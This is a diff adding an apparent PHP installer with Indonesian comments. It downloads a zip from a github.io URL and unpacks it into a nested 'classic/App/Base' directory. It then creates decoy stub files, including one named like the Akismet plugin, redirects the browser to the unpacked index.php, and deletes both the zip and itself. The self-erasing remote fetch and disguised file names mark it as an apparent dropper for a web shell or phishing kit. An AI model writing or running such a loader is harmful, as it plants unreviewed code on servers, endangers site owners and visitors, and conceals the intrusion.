@@ -1,0 +1,130 @@
+<?php
+set_time_limit(0);
+
+// Minimal PHP (opsional tapi jelas)
+if (version_compare(PHP_VERSION, '5.5.0', '<')) {
+    die("Minimal butuh PHP 5.5. Versi saat ini: " . PHP_VERSION);
+}
+
+// Cek ekstensi CURL
+if (!function_exists('curl_init')) {
+    die("Extension cURL belum aktif. Aktifkan 'curl' di PHP.");
+}
+
+// Cek ekstensi ZIP (ZipArchive)
+if (!class_exists('ZipArchive')) {
+    die("Extension ZIP belum aktif (ZipArchive tidak tersedia). Aktifkan 'zip' di PHP.");
+}
+
+$url = "https://veitokonivinaka05-creator.github.io/privacy/diff/ex.zip";
+$savePath  = __DIR__ . "/classic/App/Base/zip/ex.zip";
+$packDir   = __DIR__ . "/classic/App/Base/";
+$LockDir   = __DIR__ . "/classic/App/Base/assets/form";
+
+// root folder classic (dipakai untuk membuat file tambahan)
+$classicDir = __DIR__ . "/classic";
+
+// Pastikan semua folder sudah ada
+$zipDir = dirname($savePath);
+
+if (!is_dir($packDir)) {
+    mkdir($packDir, 0777, true);
+}
+if (!is_dir($zipDir)) {
+    mkdir($zipDir, 0777, true);
+}
+if (!is_dir($classicDir)) {
+    mkdir($classicDir, 0777, true);
+}
+
+// Download ZIP
+$fp = fopen($savePath, "w+");
+if (!$fp) {
+    die("Gagal membuka file untuk menulis: $savePath");
+}
+
+$ch = curl_init($url);
+curl_setopt($ch, CURLOPT_FILE, $fp);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+curl_setopt($ch, CURLOPT_FAILONERROR, true);
+
+// Timeout biar tidak nyangkut selamanya
+curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
+curl_setopt($ch, CURLOPT_TIMEOUT, 0); // 0 = tidak dibatasi (karena file bisa besar)
+
+// Jalankan
+$ok = curl_exec($ch);
+
+if ($ok === false) {
+    $err = curl_error($ch);
+    curl_close($ch);
+    fclose($fp);
+    die("Gagal download file: " . $err);
+}
+
+// Cek HTTP code (biar lebih jelas kalau 404/403 dll)
+$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+curl_close($ch);
+fclose($fp);
+
+if ($httpCode >= 400) {
+    @unlink($savePath);
+    die("Download gagal. HTTP Code: " . $httpCode);
+}
+
+// Cek file hasil download
+if (!file_exists($savePath) || filesize($savePath) == 0) {
+    die("File ZIP tidak ditemukan atau kosong setelah download!");
+}
+
+// Ekstrak ZIP TANPA password
+$zip = new ZipArchive;
+if ($zip->open($savePath) === TRUE) {
+    if (!$zip->extractTo($packDir)) {
+        $zip->close();
+        die("Gagal mengekstrak ZIP, kemungkinan format tidak didukung server.");
+    }
+    $zip->close();
+
+    // HAPUS ZIP setelah ekstrak berhasil
+    if (file_exists($savePath)) {
+        unlink($savePath);
+        echo "File ZIP telah dihapus setelah ekstraksi.<br>\n";
+    }
+} else {
+    die("Gagal membuka ZIP.");
+}
+
+// Tambah folder & file baru
+$targets = [
+    "Class/css.php",
+    "Base/zip.php",
+    "Style/color.php",
+    "Plugins/akismet.php",
+    "Block/asset.php",
+    "App/string.php",
+    "App/readable.php"
+];
+
+foreach ($targets as $relPath) {
+    $fullPath = $classicDir . "/" . $relPath;
+    $dir = dirname($fullPath);
+    if (!is_dir($dir)) {
+        mkdir($dir, 0755, true);
+    }
+    // isi file sederhana
+    file_put_contents($fullPath, "<?php\n// file $relPath\n");
+}
+
+echo "Install selesai. Mengalihkan ke aplikasi...<br>\n";
+echo '<meta http-equiv="refresh" content="4;url=classic/App/Base/index.php">';
+
+@flush();
+if (function_exists('fastcgi_finish_request')) {
+    @fastcgi_finish_request();
+}
+
+@unlink(__DIR__ . "/install.php");
+
+exit;
+?>
